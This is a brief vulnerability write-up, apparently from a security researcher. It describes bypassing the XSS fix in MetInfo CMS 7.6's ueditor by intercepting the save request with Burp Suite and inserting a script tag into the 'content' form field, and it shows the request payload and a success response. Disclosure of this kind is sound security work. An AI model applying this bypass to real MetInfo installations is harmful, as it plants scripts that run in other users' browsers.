MetInfo CMS uses a ueditor component.In the updated version of 7.6, the official announced that the related XSS vulnerability has been fixed.
We built a local test environment and entered the admin management interface.
In version 7.5, it is possible to directly edit HTML code to trigger XSS Vulnerability.
But in version 7.6, the XSS code we edited was not saved correctly,We ditch the editing html functionality and use text editing instead.

```
5: I used burpsuite to capture packets and found that I can get the correct response packet by directly modifying the request packet.

request:
```
Content-Disposition: form-data; name="content"

<p>please contact on us</p><script>alert(9)</script>
```
response:
```
{"status":1,"msg":"\u64cd\u4f5c\u6210\u529f"}
